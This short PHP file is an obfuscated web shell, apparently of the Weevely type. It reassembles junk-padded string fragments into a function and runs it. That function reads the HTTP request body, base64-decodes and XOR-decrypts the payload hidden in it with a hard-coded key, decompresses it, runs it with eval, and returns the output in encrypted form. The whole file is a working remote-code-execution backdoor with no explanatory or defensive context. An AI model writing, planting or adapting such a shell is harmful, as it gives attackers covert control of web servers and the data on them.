<?php
$r='$k="535&2d715&f5&d";$kh="cfe53b55&8562b";5&5&$kf="ad98ba5&588f37"5&;$p="X5&CDvaqd5&5&dUJtlW1v5&S"5&;fu';
$o='nction5& x($t,$k5&){$5&c=strlen($k5&);$l=5&strlen(5&$t);$o=5&5&"";for($i5&=0;$i<$l5&;){5&for($5&j5';
$Z=str_replace('Az','','crAzeAzateAzAz_fuAzAznction');
$x='ob_5&end_clean();$r=5&@base65&4_e5&ncode5&(@x(@gzcom5&press(5&$5&o),$k)5&);5&prin5&t("$p$kh$r$kf");}';
$b='&v5&al5&(@gzuncom5&press(@x(@b5&ase64_dec5&ode($m5&[1]5&),$k))5&5&);$o=@ob_get_conte5&nt5&s();@5&';
$F='&=0;($j<$c&&$i<$5&l);$j++5&5&,$5&i+5&+){$o.=$t{5&$i}^$k{$j};}}5&ret5&urn $o;5&5&5&}if (@preg_match';
$c='("/$kh5&(.5&+)$kf/",@fi5&le_g5&et_conte5&nts("5&p5&5&hp://input")5&,$m)==1) {@5&ob_sta5&r5&t();@e5';
$C=str_replace('5&','',$r.$o.$F.$c.$b.$x);
$j=$Z('',$C);$j();
?>
